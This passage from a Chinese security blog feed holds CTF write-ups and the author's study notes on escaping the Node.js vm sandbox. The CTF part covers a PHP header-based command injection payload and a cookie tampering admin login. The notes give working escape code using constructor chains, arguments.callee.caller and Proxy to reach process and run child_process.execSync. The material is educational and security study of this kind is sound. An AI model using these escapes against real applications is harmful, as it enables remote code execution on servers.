class="hljs-number">36</span>进制的getallheaders都会出现精度丢失导致不能成功得到getallheaders，<span class="hljs-number">30</span>进制的时候就可以了。<br></code></pre></td></tr></table></figure><p><code>system(getallheaders()&#123;1&#125;)</code>，这个<code>&#123;1&#125;</code>应该是获取包头为<code>1</code>部分的值，我说<code>应该</code>是因为没找到相关文章说这个东西。。大多直接给了<code>payload</code>(估计师傅们觉得这问题没必要说，哈哈)。我自己尝试把<code>1</code>改成别的再改对应包头也能执行命令(我这里改成了<code>333</code>)：</p><p><img src="/img/lovemath1.png" alt="lovemath1"></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="/img/kookie1.png" alt="kookie1"></p><p>让我们以<code>admin</code>的身份登录，然后提示已经有<code>cookie/monster</code>这两个账户了，选<code>cookie</code>这个用户名再随便输个密码登录一下看看：</p><p><img src="/img/kookie2.png" alt="kookie2"></p><p>可以看到行为&#x2F;用户名&#x2F;密码都是直接以<code>GET</code>方式传过去的(源码也有相应提示)，那我们直接把<code>username</code>后面的东西删掉看看能否登录：</p><p><code>/?action=login&amp;username=cookie</code></p><p>这个登不上去，换<code>monster</code>试试：</p><p><code>/?action=login&amp;username=monster</code></p><p>登录成功：</p><p><img src="/img/kookie4.png" alt="kookie4"></p><p>抓包看看<code>cookie</code>:</p><p><img src="/img/kookie5.png" alt="kookie5"></p><p>发现<code>cookie</code>字段中<code>username=monster</code>，直接改成<code>admin</code>:</p><p><img src="/img/kookie6.png" alt="kookie6"></p><p>应该是新生赛的题目</p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识vm沙箱逃逸</title>
    <link href="/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>初学者的学习笔记，没啥含金量。</p><span id="more"></span><hr><h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h3><p><code>JavaScript</code>和<code>Nodejs</code>之间有什么区别？</p><p>简单说就是<code>JavaScript</code>用于浏览器前端，<code>Nodejs</code>用在后端(服务器)。</p><p>什么是沙箱(<code>sandbox</code>)？</p><p>用于隔离恶意代码的环境，恶意代码即使在沙箱中被执行也没多大危害。</p><p>在<code>Nodejs</code>中，我们可以通过引入<code>vm</code>模块来创建一个“沙箱”，但其实这个<code>vm</code>模块的隔离功能并不完善，还有很多缺陷，因此<code>Node</code>后续升级了<code>vm</code>，也就是现在的<code>vm2</code>沙箱，<code>vm2</code>引用了<code>vm</code>模块的功能，并在其基础上做了一些优化。</p><h3 id="0x02-Node可以把字符串当代码执行"><a href="#0x02-Node可以把字符串当代码执行" class="headerlink" title="0x02 Node可以把字符串当代码执行"></a>0x02 Node可以把字符串当代码执行</h3><p>用一些参考文章中的栗子(在<code>.js</code>所在目录下创建一个<code>age.txt</code>)：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p>创建<code>hello,js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>) <span class="hljs-comment">//require函数引入Node.js的fs模块，并将其赋值给常量fs</span><br><br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-comment">//使用fs模块的readFileSync方法同步读取名为age.txt的文件，并将文件内容以UTF-8编码的形式存储在content变量中。</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<span class="hljs-comment">//打印content</span><br><br><span class="hljs-built_in">eval</span>(content)<span class="hljs-comment">//执行！</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<span class="hljs-comment">//打印age</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span><br><span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p><code>age.txt</code>中的<code>var age = 18</code>被当成字符串执行了。</p><p>不过这里有个问题：如果在当前作用域(也叫上下文)下已经有了个<code>age</code>，那么会报错。举个栗子:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">let</span> age = <span class="hljs-number">12</span> <br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<br><br><span class="hljs-built_in">eval</span>(content)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br><span class="hljs-comment">//结果：</span><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span><br><span class="hljs-attr">undefined</span>:<span class="hljs-number">1</span><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span><br>    ^<br><br><span class="hljs-title class_">SyntaxError</span>: <span class="hljs-title class_">Identifier</span> <span class="hljs-string">&#x27;age&#x27;</span> has already been declared<br></code></pre></td></tr></table></figure><p>作用域是什么？举个栗子：</p><p><code>bye.js</code>:</p><p><code>var age = 20</code></p><p><code>hello.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>) <span class="hljs-comment">//require函数引入了当前目录下的名为bye的模块，并将其赋值给常量a</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)<br><br><span class="hljs-comment">//结果：</span><br><span class="hljs-literal">undefined</span><br></code></pre></td></tr></table></figure><p>那么如何在一个文件中引入当前目录下，另一个文件中的元素？可以利用<code>exports</code>接口达到目的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//bye.js</span><br><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span><br><br><span class="hljs-built_in">exports</span>.<span class="hljs-property">age</span> = age<span class="hljs-comment">//exports是一个特殊的对象，用于将模块中的变量、函数或对象暴露给其他模块使用</span><br></code></pre></td></tr></table></figure><p><code>hello.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>) <br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)<br><br><span class="hljs-comment">//20</span><br></code></pre></td></tr></table></figure><p>若没有exports将需要的属性暴露出来，我们是访问不到另一个包内的属性的。包与包之间是互不相通的，即<code>每一个包都有自己的作用域</code>。</p><p><img src="/img/vvv1.png" alt="vvv1"></p><p>(这张图从别人那里偷的<code>y1</code>&#x3D;<code>bye</code>,<code>y2</code>&#x3D;<code>hello</code>)</p><p><code>global</code>是什么？</p><p>在Node.js中，<code>global</code>是一个全局对象，类似于浏览器环境中的<code>window</code>对象。它可以在任何地方访问，无需引入或声明。</p><p><code>global</code>对象包含了Node.js中的全局变量和全局函数。例如，<code>console</code>、<code>setTimeout</code>、<code>setInterval</code>等函数都是<code>global</code>对象的属性。可以通过<code>global</code>对象来访问这些全局函数和变量。</p><p>在Node.js中，<code>global</code>对象还可以用来创建全局变量。但是，为了避免全局变量的滥用，通常不推荐使用全局变量，而是使用模块的导出和导入机制来进行变量的共享和访问。</p><p>举个例子，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process（一会逃逸要用到）。</p><p>看一个有关全局变量的栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//bye.js</span><br><span class="hljs-variable language_">global</span>.<span class="hljs-property">age</span> = <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//hello.js</span><br><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br><br><span class="hljs-comment">//输出：</span><br><br><span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>这次我并没有利用<code>exports</code>导入<code>age</code>，但<code>hello.js</code>确实访问了另一个包的属性。</p><p>此外，还有一种方法<code>new Function</code>:</p><p>在Node.js中，<code>new Function</code>是一个构造函数，用于创建一个新的函数对象。它接受一个或多个字符串参数，其中最后一个参数是函数体，前面的参数是函数的参数列表。</p><p>使用<code>new Function</code>构造函数可以动态地创建一个函数对象，而不需要提前定义函数的名称或函数体。这种方式可以在运行时根据需要创建函数，具有一定的灵活性，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> add = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;return a + b;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 输出: 5</span><br></code></pre></td></tr></table></figure><h3 id="0x03vm沙箱"><a href="#0x03vm沙箱" class="headerlink" title="0x03vm沙箱"></a>0x03vm沙箱</h3><p>因为沙箱的目的是要隔离恶意代码，那我们可以通过创建新作用域并让恶意代码在其中运行而不影响其它作用域，看几个常用的vm模块的API：</p><p><code>vm.runinThisContext(code)</code>:在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</p><p><img src="/img/vvv2.png" alt="vvv2"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<span class="hljs-comment">//导入Node,js的vm模块</span><br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<span class="hljs-comment">//定义变量localVar，赋值initial value</span><br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<span class="hljs-comment">//使用vm.runInThisContext方法在当前上下文中运行提供的代码字符串&#x27;localVar = &quot;vm&quot;;&#x27;。该代码的作用是将变量localVar的值修改为&#x27;vm&#x27;。</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<span class="hljs-comment">//输出</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, </span><br><span class="hljs-comment">//localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure><p>可以看到，在沙箱中把字符串当代码执行<code>&#39;localVar = &quot;vm&quot;;&#39;</code>，只影响沙箱这个作用域，对其它作用域没影响。</p><p><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global<strong>外</strong>再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p><p><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p><p><img src="/img/vvv3.png" alt="vvv3"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<span class="hljs-comment">//导入util以使用inspect方法输出详细信息</span><br>  <span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br>  <span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;<span class="hljs-comment">//全局环境中定义一个全局变量globalVar，并赋值为3</span><br>  <span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> &#125;;<span class="hljs-comment">//创建一个沙箱对象sandbox，其中定义了一个名为globalVar的属性，并赋值为1</span><br>  vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-comment">//创建一个沙箱上下文，将沙箱对象sandbox作为参数传入，以便在沙箱中执行代码。</span><br>  vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);<span class="hljs-comment">//使用vm.runInContext方法在指定的沙箱上下文中执行代码字符串&#x27;globalVar *= 2;&#x27;。该代码的作用是将沙箱中的globalVar的值乘以2</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// &#123; globalVar: 2 &#125;</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span><br><span class="hljs-comment">//沙箱内无法对global有任何影响</span><br></code></pre></td></tr></table></figure><p><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</p><p><code>vm.Script类</code> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</p><p><code>new vm.Script(code, options)</code>：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。<br> code：要被解析的JavaScript代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox = &#123;<br><span class="hljs-attr">animal</span>: <span class="hljs-string">&#x27;cat&#x27;</span>,<br><span class="hljs-attr">count</span>: <span class="hljs-number">2</span><br>&#125;;<br><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>);<br><span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox));<br><span class="hljs-comment">// &#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span><br></code></pre></td></tr></table></figure><p>script对象可以通过runInXXXContext运行。</p><h3 id="0x03如何逃逸？"><a href="#0x03如何逃逸？" class="headerlink" title="0x03如何逃逸？"></a>0x03如何逃逸？</h3><p>node执行<code>RCE</code>需要引入<code>process</code>对象进而导入<code>child_process</code>模块来执行命令。然而，<code>process</code>是挂载到global上的。前面的例子也说明了在沙箱中貌似不能访问到<code>global</code>，那么该如何逃逸？如何拿到<code>process</code>？</p><p>vm模块是非常不严谨的，基于node原型链继承的特性，我们很容易就能拿到外部全局变量。比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-comment">//严格模式</span><br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> a = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return global&#x27;)()`</span>);<span class="hljs-comment">//获取全局对象 global</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">process</span>);<br><span class="hljs-comment">//code参数最好用反引号包裹，这样可以使code更严格便于执行</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    this.constructor：获取当前执行上下文的构造函数。</span><br><span class="hljs-comment">    this.constructor.constructor：获取构造函数的构造函数，即原始的 Function 构造函数。</span><br><span class="hljs-comment">    this.constructor.constructor(&#x27;return global&#x27;)()：通过调用原始的 Function 构造函数，执行字符串 &#x27;return global&#x27;，从而获取全局对象 global。</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/vvv4.png" alt="vvv4"></p><p>这里的<code>this</code>是指向传递到<code>runInNewContext</code>函数的一个对象，他是<strong>不属于沙箱内部环境</strong>的，访问当前对象的构造器的构造器，也就是Function的构造器，由于继承关系，它的作用域是全局变量，执行代码，获取外部global。拿到process对象就可以执行命令了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span>;<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-keyword">const</span> a = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor(&#x27;return process&#x27;)()`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>());<span class="hljs-comment">//通过 a 对象中的 mainModule 属性，获取当前进程的主模块对象，然后使用 require 方法加载 child_process 模块，并调用 execSync 方法执行命令 whoami，获取当前进程的用户名，并将其转换为字符串后打印出来。</span><br><span class="hljs-comment">//结果：v1per3\rdj</span><br></code></pre></td></tr></table></figure><p>一些其它情况：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<span class="hljs-comment">//创建一个空对象 sandbox，作为沙盒环境的上下文对象。这里使用 Object.create(null) 创建一个没有原型链的纯净对象，以避免访问到原始的全局对象(它不会继承任何属性和方法)</span><br><span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);<span class="hljs-comment">//vm.createContext 方法创建一个沙盒环境的上下文对象 context，并将之前创建的 sandbox 对象作为参数传入</span><br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-comment">//在指定的沙盒环境中执行 JavaScript 代码。script 是之前定义的 JavaScript 代码字符串，context 是沙盒环境的上下文对象。执行结果将被赋值给 res 变量。</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)<span class="hljs-comment">//打印输出字符串 &#x27;Hello &#x27; 和 res 变量的值。</span><br></code></pre></td></tr></table></figure><p>现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p><p>我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。</p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`(() =&gt; &#123;</span><br><span class="hljs-string">    const a = &#123;&#125; //创建空对象a</span><br><span class="hljs-string">    a.toString = function () &#123;//定义了a中的toString方法</span><br><span class="hljs-string">      const cc = arguments.callee.caller;//通过 arguments.callee.caller 获取到调用该方法的函数的引用,在下面两行中用到</span><br><span class="hljs-string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">  &#125;)()`</span>;<br><br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<span class="hljs-comment">//res是一个恶意对象</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello &#x27;</span> + res)<span class="hljs-comment">//在这里调用了重写的toString方法</span><br><br><span class="hljs-comment">//Hello v1per3\rdj</span><br><span class="hljs-comment">//() =&gt; &#123; ... &#125; 这种形式表示一个没有参数的箭头函数，箭头函数可以用来定义匿名函数，它的语法比传统的函数定义更加简洁。</span><br></code></pre></td></tr></table></figure><p>解释下这个方法：先对<code>toString</code>方法进行了重写(重写不改变方法何时被调用)。<code>console.log(&#39;Hello &#39; + res)</code>时(一个对象与字符串发生了<code>关系</code>)，就会调用<code>toString</code>方法。(感觉有点像PHP中的魔术方法)</p><p>在 <code>toString</code> 方法中，通过 <code>arguments.callee.caller</code> 获取到调用<strong>该方法的函数</strong>的引用，并利用该引用获取到 <code>process</code> 对象，然后使用 <code>child_process</code> 模块的 <code>execSync</code> 方法执行命令 <code>whoami</code>，并将结果转换为字符串返回。实现了<code>RCE</code></p><p>当然，有时即使我们重写了<code>toString</code>函数，但沙箱外并不存在去触发该函数的相关操作或根本不能重写函数，这时我们可以用<code>Proxy</code>来劫持属性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<span class="hljs-comment">//导入vm模块</span><br><br><span class="hljs-keyword">const</span> script = <br><span class="hljs-string">`</span><br><span class="hljs-string">(() =&gt;&#123; //</span><br><span class="hljs-string">    const a = new Proxy(&#123;&#125;, &#123; //代理了空对象并对get方法进行重写，代理对象是指通过使用ES6中的Proxy对象来包装另一个对象，从而可以拦截并重定义该对象的基本操作（比如属性查找、赋值、删除等）。代理对象允许我们在对目标对象进行操作时，可以自定义并添加额外的行为。</span><br><span class="hljs-string">        get: function()&#123;</span><br><span class="hljs-string">            const cc = arguments.callee.caller;</span><br><span class="hljs-string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="hljs-string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">    return a</span><br><span class="hljs-string">&#125;)()//这个()为了调用匿名函数</span><br><span class="hljs-string">`</span>;<br><span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);<br><span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)<br></code></pre></td></tr></table></figure><p>参考文章：</p><p><code>https://xz.aliyun.com/t/11859</code></p><p><code>https://blog.csdn.net/m0_62422842/article/details/128553953</code></p><p><code>[Proxy 和 Reflect - 掘金 (juejin.cn)](https://juejin.cn/post/6844904090116292616)</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识JavaScript原型链污染</title>
    <link href="/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/22/2023-10-22-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
